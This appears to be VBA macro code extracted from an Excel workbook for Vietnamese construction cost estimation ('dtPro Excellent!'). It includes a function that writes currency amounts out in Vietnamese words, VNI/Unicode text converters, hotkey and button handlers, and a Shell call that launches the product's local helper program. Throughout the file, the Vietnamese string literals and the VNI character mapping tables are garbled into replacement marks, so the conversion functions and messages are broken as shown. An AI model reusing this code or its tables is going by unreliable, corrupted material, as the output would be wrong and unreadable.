Attribute VB_Name = "Func"
Function SoChu(ByVal NumCurrency As Currency) As String
If NumCurrency = 0 Then
SoChu = "Kho|fffd|ng |fffd|o|fffd|ng"
Exit Function
End If
If NumCurrency > 922337203685477# Then ' So|fffd| l|fffd||fffd|n nha|fffd|t cu|fffd|a loa|fffd|i CURRENCY
SoChu = "Kho|fffd|ng |fffd|o|fffd|i |fffd||fffd||fffd||fffd|c so|fffd| l|fffd||fffd|n h|fffd|n 922,337,203,685,477"
Exit Function
End If
'-------------------------------------------------
Static CharVND(9) As String, BangChu As String, I As Integer
Dim SoLe, SoDoi As Integer, PhanChan, ten As String
CharVND(1) = "mo|fffd|t"
CharVND(2) = "hai"
CharVND(3) = "ba"
CharVND(4) = "bo|fffd|n"
CharVND(5) = "na|fffd|m"
CharVND(6) = "sa|fffd|u"
CharVND(7) = "ba|fffd|y"
CharVND(8) = "ta|fffd|m"
CharVND(9) = "ch|fffd|n"
'-------------------------------------------------
SoLe = Int((NumCurrency - Int(NumCurrency)) * 100) '2 k|fffd| so|fffd| le|fffd|
I = 1
PhanChan = Trim$(Str$(Int(NumCurrency)))
While Len(PhanChan) > 0
Select Case I
Case 1 'Dong
dong = Val(Right$(PhanChan, 3))
PhanChan = Left$(PhanChan, Len(PhanChan) - Len(Right$(PhanChan, 3))) 'Len(Trim$(Str$(Dong)))
Case 2 'Ngan
Ngan = Val(Right$(PhanChan, 3))
PhanChan = Left$(PhanChan, Len(PhanChan) - Len(Right$(PhanChan, 3)))
Case 3 'Trieu
Trieu = Val(Right$(PhanChan, 3))
PhanChan = Left$(PhanChan, Len(PhanChan) - Len(Right$(PhanChan, 3)))
Case 4 'Ty
Ty = Val(Right$(PhanChan, 3))
PhanChan = Left$(PhanChan, Len(PhanChan) - Len(Right$(PhanChan, 3)))
Case 5 'Ngan Ty
NganTy = Val(Right$(PhanChan, 3))
PhanChan = Left$(PhanChan, Len(PhanChan) - Len(Right$(PhanChan, 3)))
End Select
I = I + 1
Wend
If NganTy = 0 And Ty = 0 And Trieu = 0 And Ngan = 0 And dong = 0 Then
BangChu = "kho|fffd|ng |fffd|o|fffd|ng "
I = 5
Else
BangChu = ""
I = 0
End If
While I <= 5 ' Ba|fffd|t |fffd|a|fffd|u |fffd|o|fffd|i
Select Case I
Case 0
SoDoi = NganTy
ten = "nga|fffd|n ty|fffd|"
Case 1
SoDoi = Ty
ten = "ty|fffd|"
Case 2
SoDoi = Trieu
ten = "trie|fffd|u"
Case 3
SoDoi = Ngan
ten = "nga|fffd|n"
Case 4
SoDoi = dong
ten = "|fffd|o|fffd|ng"
Case 5
SoDoi = SoLe
ten = "xu"
End Select
If SoDoi <> 0 Then
Tram = Int(SoDoi / 100)
Muoi = Int((SoDoi - Tram * 100) / 10)
DonVi = (SoDoi - Tram * 100) - Muoi * 10
BangChu = BangChu + IIf(Tram <> 0, CharVND(Tram) + " tra|fffd|m ", "")
If Muoi = 0 And Tram <> 0 And DonVi <> 0 Then
BangChu = BangChu + "le|fffd| "
Else
If Muoi <> 0 Then
BangChu = BangChu + IIf(Muoi <> 0 And Muoi <> 1, CharVND(Muoi) + " m|fffd||fffd|i ", "m|fffd||fffd||fffd|i ")
End If
End If
If Muoi <> 0 And DonVi = 5 Then
BangChu = BangChu + "la|fffd|m " + ten + " "
Else
If Muoi <> 0 And Muoi <> 1 And DonVi = 1 Then
BangChu = BangChu + "mo|fffd|t " + ten + " "
Else
BangChu = BangChu + IIf(DonVi <> 0, CharVND(DonVi) + " " + ten + " ", ten + " ")
End If
End If
Else
BangChu = BangChu + IIf(I = 4, "|fffd|o|fffd|ng ", "")
End If
I = I + 1
Wend
If SoLe = 0 Then
BangChu = BangChu + "cha|fffd|n"
End If
Mid$(BangChu, 1, 1) = UCase$(Mid$(BangChu, 1, 1))
SoChu = BangChu
End Function

Function vni2uni(text As String) As String
    iUNI = Array(225, 224, 7843, 227, 7841, 226, 7845, 7847, 7849, 7851, 7853, 259, 7855, 7857, 7859, _
    7861, 7863, 273, 233, 232, 7867, 7869, 7865, 234, 7871, 7873, 7875, 7877, 7879, 237, 236, 7881, 297, _
    7883, 243, 242, 7887, 245, 7885, 244, 7889, 7891, 7893, 7895, 7897, 417, 7899, 7901, 7903, 7905, 7907, _
    250, 249, 7911, 361, 7909, 432, 7913, 7915, 7917, 7919, 7921, 253, 7923, 7927, 7929, 7925, 193, 192, 7842, _
    195, 7840, 194, 7844, 7846, 7848, 7850, 7852, 258, 7854, 7856, 7858, 7860, 7862, 272, 201, 200, 7866, 7868, _
    7864, 202, 7870, 7872, 7874, 7876, 7878, 205, 204, 7880, 296, 7882, 211, 210, 7886, 213, 7884, 212, 7888, _
    7890, 7892, 7894, 7896, 416, 7898, 7900, 7902, 7904, 7906, 218, 217, 7910, 360, 7908, 431, 7912, 7914, 7916, _
    7918, 7920, 221, 7922, 7926, 7928, 7924)
    
    itextVNI = ",a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,a|fffd|,|fffd| ,e|fffd|,e|fffd|,e|fffd|,e|fffd|,e|fffd|,e|fffd|,e|fffd|,e|fffd|,e|fffd|,e|fffd|,e|fffd|,|fffd| ,|fffd| ,|fffd| ,|fffd| ,|fffd| ,o|fffd|,o|fffd|,o|fffd|,o|fffd|,o|fffd|,o|fffd|,o|fffd|,o|fffd|,o|fffd|,o|fffd|,o|fffd|,|fffd| ,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,u|fffd|,u|fffd|,u|fffd|,u|fffd|,u|fffd|,|fffd| ,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,y|fffd|,y|fffd|,y|fffd|,y|fffd|,|fffd| ,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,A|fffd|,|fffd| ,E|fffd|,E|fffd|,E|fffd|,E|fffd|,E|fffd|,E|fffd|,E|fffd|,E|fffd|,E|fffd|,E|fffd|,E|fffd|,|fffd| ,|fffd| ,|fffd| ,|fffd| ,|fffd| ,O|fffd|,O|fffd|,O|fffd|,O|fffd|,O|fffd|,O|fffd|,O|fffd|,O|fffd|,O|fffd|,O|fffd|,O|fffd|,|fffd| ,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,U|fffd|,U|fffd|,U|fffd|,U|fffd|,U|fffd|,|fffd| ,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,|fffd||fffd|,Y|fffd|,Y|fffd|,Y|fffd|,Y|fffd|,|fffd| ,"
    sText = (text)
    sText = Replace(sText, "0|fffd|", "|fffd|")
    sText = Replace(sText, "1|fffd|", "|fffd|")
    sText = Replace(sText, "2|fffd|", "|fffd|")
    sText = Replace(sText, "3|fffd|", "|fffd|")
    For I = 1 To Len(sText)
        Doup = False
        istr = Mid(sText, I, 1)
        If InStr("aeo|fffd|u|fffd|yAEO|fffd|U|fffd|Y|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", istr) > 0 Then
            If I < Len(sText) Then
                istr2 = Mid(sText, I + 1, 1)
                Select Case AscW(istr2)
                    Case 227
                        istr2 = "|fffd|"
                    Case 245
                        istr2 = "|fffd|"
                    Case 195
                        istr2 = "|fffd|"
                    Case 213
                        istr2 = "|fffd|"
                End Select
                If istr2 Like "[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]" = True _
                        Or istr2 Like "[|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|]" = True Then
                    Doup = True
                End If
            End If
            If Doup Then
                istr = istr + istr2 'Mid(sText, I, 2)
                istrtam = "," + istr + ","
            Else
                istr = Mid(sText, I, 1)
                istrtam = "," + istr + " ,"
            End If
            If InStr(itextVNI, istrtam) > 0 Then
                istr = ChrW(iUNI((InStr(itextVNI, istrtam) + 2) / 3 - 1))
            End If
        End If
        vni2uni = vni2uni + istr
        If Len(sText) > 2 And Doup = True Then
            I = I + 1
        ElseIf Len(sText) = 2 And Doup = True Then
            Exit Function
        End If
    Next
End Function

Function uni2vni(text As String) As String
    itextUNI = ",225 ,224 ,7843,227 ,7841,226 ,7845,7847,7849,7851,7853,259 ,7855,7857,7859,7861,7863,273 ,233 ,232 ,7867,7869,7865,234 ,7871,7873,7875,7877,7879,237 ,236 ,7881,297 ,7883,243 ,242 ,7887,245 ,7885,244 ,7889,7891,7893,7895,7897,417 ,7899,7901,7903,7905,7907,250 ,249 ,7911,361 ,7909,432 ,7913,7915,7917,7919,7921,253 ,7923,7927,7929,7925,193 ,192 ,7842,195 ,7840,194 ,7844,7846,7848,7850,7852,258 ,7854,7856,7858,7860,7862,272 ,201 ,200 ,7866,7868,7864,202 ,7870,7872,7874,7876,7878,205 ,204 ,7880,296 ,7882,211 ,210 ,7886,213 ,7884,212 ,7888,7890,7892,7894,7896,416 ,7898,7900,7902,7904,7906,218 ,217 ,7910,360 ,7908,431 ,7912,7914,7916,7918,7920,221 ,7922,7926,7928,7924,"
    
    iVNI = Array("a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", "a|fffd|", _
    "a|fffd|", "|fffd|", "e|fffd|", "e|fffd|", "e|fffd|", "e|fffd|", "e|fffd|", "e|fffd|", "e|fffd|", "e|fffd|", "e|fffd|", "e|fffd|", "e|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "o|fffd|", "o|fffd|", _
    "o|fffd|", "o|fffd|", "o|fffd|", "o|fffd|", "o|fffd|", "o|fffd|", "o|fffd|", "o|fffd|", "o|fffd|", "|fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "u|fffd|", "u|fffd|", "u|fffd|", "u|fffd|", _
    "u|fffd|", "|fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "y|fffd|", "y|fffd|", "y|fffd|", "y|fffd|", "|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", _
    "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "A|fffd|", "|fffd|", "E|fffd|", "E|fffd|", "E|fffd|", "E|fffd|", "E|fffd|", "E|fffd|", "E|fffd|", "E|fffd|", _
    "E|fffd|", "E|fffd|", "E|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "|fffd|", "O|fffd|", "O|fffd|", "O|fffd|", "O|fffd|", "O|fffd|", "O|fffd|", "O|fffd|", "O|fffd|", "O|fffd|", "O|fffd|", "O|fffd|", "|fffd|", _
    "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "U|fffd|", "U|fffd|", "U|fffd|", "U|fffd|", "U|fffd|", "|fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "|fffd||fffd|", "Y|fffd|", "Y|fffd|", "Y|fffd|", _
    "Y|fffd|", "|fffd|")
            
    sText = (text)
    For I = 1 To Len(sText)
        istr = Mid(sText, I, 1)
        bienchuoimauni = AscW(istr)
        If bienchuoimauni >= 192 Then
            istr = iVNI((InStr(itextUNI, "," + Left(Trim(Str(bienchuoimauni)) + " ", 4) + ",") - 1) / 5)
        End If
        uni2vni = uni2vni + istr
    Next
    uni2vni = Replace(uni2vni, "|fffd|", "0|fffd|")
    uni2vni = Replace(uni2vni, "|fffd|", "1|fffd|")
    uni2vni = Replace(uni2vni, "|fffd|", "2|fffd|")
    uni2vni = Replace(uni2vni, "|fffd|", "3|fffd|")
End Function
Function dmcanduoi(vungtra)
MsgBox (vungtra)

End Function
Attribute VB_Name = "Module"
#If VBA7 And Win64 Then 'Office 64-bit
Private Declare PtrSafe Function GetActiveWindow Lib "user32" () As Long
Private Declare PtrSafe Function MessageBoxW Lib "user32" (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long
#Else
Private Declare Function GetActiveWindow Lib "user32" () As Long
Private Declare Function MessageBoxW Lib "user32" (ByVal hwnd As Long, ByVal lpText As String, ByVal lpCaption As String, ByVal wType As Long) As Long
#End If
Sub caidatf9()
Select Case UCase(ActiveSheet.Name)
    Case "DUTOAN"
        Sheet7.CmdTinhBangDonGia_Click
    Case "PHANTICH"
        Sheet8.CmdTinhBangPhanTich_Click
    Case "HAOPHI"
        'Sheet9.CmdGhiGiaHaoPhi_Click
        If Sheet13.Visible = 0 Then
            Sheet13.Visible = True
        End If
        Sheet13.Select
    Case "THDT"
        Sheet7.Visible = True
        Sheet7.Select
    Case Else
        Application.Calculate
End Select
End Sub
Sub caidatf10()
Select Case UCase(ActiveSheet.Name)
    Case "DUTOAN"
        Sheet7.CmdSuaDM_Click
    Case "PHANTICH"
        Sheet8.CmdLuuDinhMuc_Click
    Case "HAOPHI"
    Case "THDT"
    Case Else
End Select
End Sub
Sub caidatf11()
If UCase(ActiveSheet.Name) = "DUTOAN" Then
    Sheet5.Range("masorun") = 1
    Sheet5.Range("id") = 1
    Sheet7.Cells(ActiveCell.Row, 3).Select
    If Len(Selection.Value) > 6 Then
        Selection.Value = Selection.Value + Chr(9)
    End If
    runfiledtpro
    'If Selection.Column = 3 Then
    '    Selection.Value = Replace(Selection.Value, "?", "")
    'End If
End If
End Sub
Sub caidatctrlins()
Select Case UCase(ActiveSheet.Name)
    Case "DUTOAN"
        Sheet7.LblChendong_Click
    Case "PHANTICH"
        Rows(Trim(Str(Selection.Row + 1)) + ":" + Trim(Str(Selection.Row + Selection.Rows.Count))).Insert
        Cells(Selection.Row + 1, Selection.Column).Select
End Select
'MsgBox "caidatctrlins"
End Sub
Sub caidatctrldel()
    Sheet7.LblXoaDong_Click
'MsgBox "caidatctrlins"
End Sub

Sub subvni2uni()
For Each ohienhanh In Selection
    If Left(ohienhanh.Formula, 1) <> "=" Then
        ohienhanh.Value = vni2uni(ohienhanh.Value)
    End If
Next ohienhanh
End Sub

Sub subuni2vni()
For Each ohienhanh In Selection
    If Left(ohienhanh.Formula, 1) <> "=" Then
        ohienhanh.Value = uni2vni(ohienhanh.Value)
    End If
Next ohienhanh
End Sub
Sub subvni2unidutoan()
For I = Sheet7.Range("dtdulieu").Row To Sheet7.Range("dtdulieu").Row + Sheet7.Range("dtdulieu").Rows.Count
    Sheet7.Cells(I, 4) = vni2uni(Sheet7.Cells(I, 4))
    Sheet7.Cells(I, 5) = vni2uni(Sheet7.Cells(I, 5))
Next
End Sub
Sub subvni2uniphantich()
'For I = Sheet7.Range("dtdulieu").Row To Sheet7.Range("dtdulieu").Row + Sheet7.Range("dtdulieu").Rows.Count
'    Sheet7.Cells(I, 4) = vni2uni(Sheet7.Cells(I, 4))
'    Sheet7.Cells(I, 5) = vni2uni(Sheet7.Cells(I, 5))
'Next
End Sub
Sub subvni2unihaophivatlieu()
For I = Sheet9.Range("hpdulieuvl").Row + 1 To Sheet9.Range("hpdulieuvl").Row + Sheet9.Range("hpdulieuvl").Rows.Count - 3
    Sheet9.Cells(I, 4) = vni2uni(Sheet9.Cells(I, 4))
    Sheet9.Cells(I, 6) = vni2uni(Sheet9.Cells(I, 6))
    Sheet9.Cells(I, 13) = vni2uni(Sheet9.Cells(I, 13))
Next
End Sub
Sub runfiledtpro()
If Dir(Range("thumucdtpro") + "\dtproexl.exe") = "" Then
    chuoithongbao = vni2uni("Kho|fffd|ng t|fffd|m tha|fffd|y th|fffd| mu|fffd|c ch|fffd||fffd|a ch|fffd||fffd|ng tr|fffd|nh dtPro Excellent! Ba|fffd|n ha|fffd|y cho|fffd|n th|fffd| mu|fffd|c ch|fffd||fffd|a file dtproexl.exe ro|fffd|i th|fffd||fffd| la|fffd|i")
    bienchon = MsgBoxUni(chuoithongbao, vbOKOnly, "dtPro Excellent!")
    Sheet5.CmdChonThuMuc_Click
    'ctdtPro = Shell(Sheet5.Range("thumucdtpro") + "\dtproexl.exe", vbMaximizedFocus)
Else
    If Sheet5.Range("id") = 1 Then
        ctdtPro = Shell(Sheet5.Range("thumucdtpro") + "\dtproexl.exe", vbNormalFocus)
    Else
        ctdtPro = Shell(Sheet5.Range("thumucdtpro") + "\dtproexl.exe", vbNormalFocus)
    End If
End If
End Sub

 
Function MsgBoxUni(ByVal PromptUni As Variant, Optional ByVal Buttons As VbMsgBoxStyle = vbOKOnly, Optional ByVal TitleUni As Variant = vbNullString) As VbMsgBoxResult
Dim BStrMsg, BStrTitle
    BStrMsg = StrConv(PromptUni, vbUnicode)
    BStrTitle = StrConv(TitleUni, vbUnicode)
    MsgBoxUni = MessageBoxW(GetActiveWindow, BStrMsg, BStrTitle, Buttons)
End Function

Attribute VB_Name = "Module1"
Sub Macro29()
Attribute Macro29.VB_Description = "Macro recorded 12/25/2010 by insti"
Attribute Macro29.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro29 Macro
' Macro recorded 12/25/2010 by insti
'

'
    Application.Goto Reference:="giamdulieu"
    Selection.Sort Key1:=Range("D11"), Order1:=xlAscending, Header:=xlGuess, _
        OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal
End Sub
Attribute VB_Name = "Module2"
Sub Macro1()
Attribute Macro1.VB_Description = "Macro recorded 22/06/2016 by MAYTINH"
Attribute Macro1.VB_ProcData.VB_Invoke_Func = " \n14"
'
' Macro1 Macro
' Macro recorded 22/06/2016 by MAYTINH
'

'
    Range("D85").Select
    ActiveCell.FormulaR1C1 = "=thTongChiPhiXayDungTruocThue"
    Range("D86").Select
    Selection.ClearContents
    Range("D85").Select
    Range("D86").Select
    ActiveWindow.SmallScroll Down:=-6
    Range("D86").Select
    With Selection.Validation
        .Delete
        .Add Type:=xlValidateList, AlertStyle:=xlValidAlertStop, Operator:= _
        xlBetween, Formula1:="=$A$75:$A$82"
        .IgnoreBlank = True
        .InCellDropdown = True
        .InputTitle = ""
        .ErrorTitle = ""
        .InputMessage = ""
        .ErrorMessage = ""
        .ShowInput = True
        .ShowError = True
    End With
    ActiveWindow.SmallScroll Down:=-6
End Sub
Attribute VB_Name = "Sheet1"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet10"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet11"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Sheet12"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "CmdCapnhat, 1, 0, MSForms, CommandButton"
Attribute VB_Control = "CmdLaygiaNC, 2, 1, MSForms, CommandButton"
Private Sub CmdCapnhat_Click()
Application.Calculation = xlCalculationManual
'Application.Interactive = False
Application.ScreenUpdating = False
'Application.DisplayAlerts = False
' XOA DONG
sodonggiam = Range("giamdulieu").Rows.Count
For I = 1 To sodonggiam - 3
'Cells(Range("giamdulieu").Row + I, 4) = I
If Cells(Range("giamdulieu").Row + sodonggiam - 2 - I, 7).text = "" Then
    'Cells(Range("giamdulieu").Row + sodonggiam - 1 - I, 4) = I
    Rows(Range("giamdulieu").Row + sodonggiam - 2 - I).Delete
End If
Next
chuoigiamhienco = "//"
For I = 1 To Range("giamdulieu").Rows.Count - 3
    chuoigiamhienco = chuoigiamhienco + Cells(Range("giamdulieu").Row + I, 4) + "//"
Next
'Cells(8, 4) = chuoigiamhienco
' THEM DONG
sodongthem = Sheet9.Range("hpdulieum").Rows.Count - Range("giamdulieu").Rows.Count
If sodongthem > 0 Then
    If Dir(Sheet5.Range("thumucdtpro") + "\NhienlieuNhancongMay.xls") = "" Then
        chuoithongbao = vni2uni("Kho|fffd|ng t|fffd|m tha|fffd|y file <NhienlieuNhancongMay.xls>. Ba|fffd|n ha|fffd|y download t|fffd||fffd| trang www.dutoan.com va|fffd| th|fffd||fffd| la|fffd|i. Hoa|fffd|c ba|fffd|n cu|fffd|ng co|fffd| the|fffd| t|fffd||fffd| nha|fffd|p |fffd||fffd|nh m|fffd||fffd|c ne|fffd|u muo|fffd|n")
        bienchon = MsgBoxUni(chuoithongbao, vbOKOnly, "dtPro Excellent!")
    Else
        'bienchon = MsgBoxUni("co file may", vbOKOnly, "dtPro Excellent!")
    
    End If
    chuoidongthem = Trim(Str(Range("giamdulieu").Row + 1)) + ":" + Trim(Str(Range("giamdulieu").Row + sodongthem))
    Rows(chuoidongthem).Insert
    donggiamdulieu = Range("giamdulieu").Row
    For I = 1 To Sheet9.Range("hpdulieum").Rows.Count - 3
        'Cells(8, 4) = Cells(8, 4) + "//" + Sheet9.Cells(Sheet9.Range("hpdulieum").Row + I, 4).Value + "//"
        If InStr(chuoigiamhienco, "//" + Sheet9.Cells(Sheet9.Range("hpdulieum").Row + I, 4).Value + "//") = 0 Then
            donggiamdulieu = donggiamdulieu + 1
            Cells(donggiamdulieu, 4) = Sheet9.Cells(Sheet9.Range("hpdulieum").Row + I, 4).Value
            Cells(donggiamdulieu, 6) = "ca"
            Cells(donggiamdulieu, 7) = "=SUMIF(pttencv,RC[-3],ptklhp)"
            If Not Dir(Sheet5.Range("thumucdtpro") + "\NhienlieuNhancongMay.xls") = "" Then
                 ' LAY DU LIEU TU FILE
                Cells(donggiamdulieu, 8) = "=VLOOKUP(RC[-4],'" + Sheet5.Range("thumucdtpro") + "\NhienlieuNhancongMay.xls" + "'!nlncmayvungdulieu,2,0)"
                Cells(donggiamdulieu, 9) = "=VLOOKUP(RC[-5],'" + Sheet5.Range("thumucdtpro") + "\NhienlieuNhancongMay.xls" + "'!nlncmayvungdulieu,3,0)"
                Cells(donggiamdulieu, 10) = "=VLOOKUP(RC[-6],'" + Sheet5.Range("thumucdtpro") + "\NhienlieuNhancongMay.xls" + "'!nlncmayvungdulieu,4,0)"
                Cells(donggiamdulieu, 11) = "=VLOOKUP(RC[-7],'" + Sheet5.Range("thumucdtpro") + "\NhienlieuNhancongMay.xls" + "'!nlncmayvungdulieu," + Trim(Str(4 + Range("giamstttinh"))) + ",0)"
                colinkcongthucmay = True
            Else
                colinkcongthucmay = False
            End If
            ' CONG THUC NHAN
            Cells(donggiamdulieu, 15) = "=RC[-8]*RC[-7]"
            Cells(donggiamdulieu, 16) = "=RC[-9]*RC[-7]"
            Cells(donggiamdulieu, 17) = "=RC[-10]*RC[-7]"
            Cells(donggiamdulieu, 18) = "=RC[-11]*RC[-7]"
        End If
    Next
End If
    '   SAP XEP MAY
    Range("A" + Trim(Str(Range("giamdulieu").Row + 1)) + ":U" + Trim(Str(Range("giamdulieu").Row + Range("giamdulieu").Rows.Count - 3))).Select
    Selection.Sort Key1:=Range("D" + Trim(Str(Range("giamdulieu").Row + 1))), Order1:=xlAscending, Header:=xlGuess, _
        OrderCustom:=1, MatchCase:=False, Orientation:=xlTopToBottom, _
        DataOption1:=xlSortNormal
    For I = 1 To Range("giamdulieu").Rows.Count - 3
        Cells(Range("giamdulieu").Row + I, 1) = I
    Next
Application.Calculation = xlCalculationAutomatic
'Application.Interactive = True
Application.ScreenUpdating = True
'Application.DisplayAlerts = True
If colinkcongthucmay Then
    ActiveWorkbook.BreakLink Name:=Sheet5.Range("thumucdtpro") + "\NhienlieuNhancongMay.xls", Type:=xlExcelLinks
End If
End Sub

Private Sub CmdLaygiaNC_Click()
If Dir(Sheet5.Range("thumucdtpro") + "\NhienlieuNhancongMay.xls") = "" Then
    chuoithongbao = vni2uni("Kho|fffd|ng t|fffd|m tha|fffd|y file <NhienlieuNhancongMay.xls>. Ba|fffd|n ha|fffd|y download t|fffd||fffd| trang www.dutoan.com va|fffd| th|fffd||fffd| la|fffd|i. Hoa|fffd|c ba|fffd|n cu|fffd|ng co|fffd| the|fffd| t|fffd||fffd| nha|fffd|p |fffd||fffd|nh m|fffd||fffd|c ne|fffd|u muo|fffd|n")
    bienchon = MsgBoxUni(chuoithongbao, vbOKOnly, "dtPro Excellent!")
Else
    donggiamdulieu = Range("giamdulieu").Row
    For I = 1 To Range("giamdulieu").Rows.Count - 3
        Cells(donggiamdulieu + I, 11) = "=VLOOKUP(RC[-7],'" + Sheet5.Range("thumucdtpro") + "\NhienlieuNhancongMay.xls" + "'!nlncmayvungdulieu," + Trim(Str(4 + Range("giamstttinh"))) + ",0)"
    Next
    ActiveWorkbook.BreakLink Name:=Sheet5.Range("thumucdtpro") + "\NhienlieuNhancongMay.xls", Type:=xlExcelLinks
End If
End Sub
Attribute VB_Name = "Sheet13"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "CmdLayDG, 1, 0, MSForms, CommandButton"
Attribute VB_Control = "CmdKieubangTHDT, 2, 1, MSForms, CommandButton"

Private Sub CmdKieubangTHDT_Click()
Select Case Me.CmdKieubangTHDT.Caption
    Case "[1]"
        Me.CmdKieubangTHDT.Caption = "[2]"
        Range("thdtkieu1").EntireRow.Hidden = True
        Range("thdtkieu2").EntireRow.Hidden = False
        Range("thdtkieu3").EntireRow.Hidden = True
        Range("thdtkieu4").EntireRow.Hidden = True
    Case "[2]"
        Me.CmdKieubangTHDT.Caption = "[3]"
        Range("thdtkieu1").EntireRow.Hidden = True
        Range("thdtkieu2").EntireRow.Hidden = True
        Range("thdtkieu3").EntireRow.Hidden = False
        Range("thdtkieu4").EntireRow.Hidden = True
    Case "[3]"
        Me.CmdKieubangTHDT.Caption = "[4]"
        Range("thdtkieu1").EntireRow.Hidden = True
        Range("thdtkieu2").EntireRow.Hidden = True
        Range("thdtkieu3").EntireRow.Hidden = True
        Range("thdtkieu4").EntireRow.Hidden = False
     Case "[4]"
        Me.CmdKieubangTHDT.Caption = "[5]"
        Range("thdtkieu1").EntireRow.Hidden = False
        Range("thdtkieu2").EntireRow.Hidden = False
        Range("thdtkieu3").EntireRow.Hidden = False
        Range("thdtkieu4").EntireRow.Hidden = False
    Case "[5]"
        Me.CmdKieubangTHDT.Caption = "[1]"
        Range("thdtkieu1").EntireRow.Hidden = False
        Range("thdtkieu2").EntireRow.Hidden = True
        Range("thdtkieu3").EntireRow.Hidden = True
        Range("thdtkieu4").EntireRow.Hidden = True
End Select
End Sub
Private Sub Worksheet_Activate()
For I = 1 To 10
Calculate
Sheet5.Range("cdTongChiPhiXayDungTruocThue") = Range("thTongChiPhiXayDungTruocThue").Value
Next
End Sub
Attribute VB_Name = "Sheet14"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "CmdTinhDGTH2, 1, 0, MSForms, CommandButton"
Attribute VB_Control = "CmdTinhDGTH1, 2, 1, MSForms, CommandButton"
Sub CmdTinhDGTH1_Click()
If Sheet7.ChkDTPhanTichVatLieu Then
    Sheet5.Range("id") = 4
    runfiledtpro
Else
    MsgBoxUni vni2uni("Ba|fffd|n pha|fffd|i cho|fffd|n pha|fffd|n t|fffd|ch Va|fffd|t lie|fffd|u trong ba|fffd|ng D|fffd||fffd| toa|fffd|n")
End If
End Sub

Sub CmdTinhDGTH2_Click()
If Sheet7.ChkDTPhanTichVatLieu And Sheet7.ChkDTPhanTichNhanCong And Sheet7.ChkDTPhanTichMay Then
    Sheet5.Range("id") = 5
    runfiledtpro
Else
    MsgBoxUni vni2uni("Ba|fffd|n pha|fffd|i cho|fffd|n pha|fffd|n t|fffd|ch ca|fffd| VL, NC, M trong ba|fffd|ng D|fffd||fffd| toa|fffd|n")
End If
End Sub
Attribute VB_Name = "Sheet15"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "CmdTinhDGTH22, 1, 0, MSForms, CommandButton"
Attribute VB_Control = "CmdTinhDGTH21, 2, 1, MSForms, CommandButton"
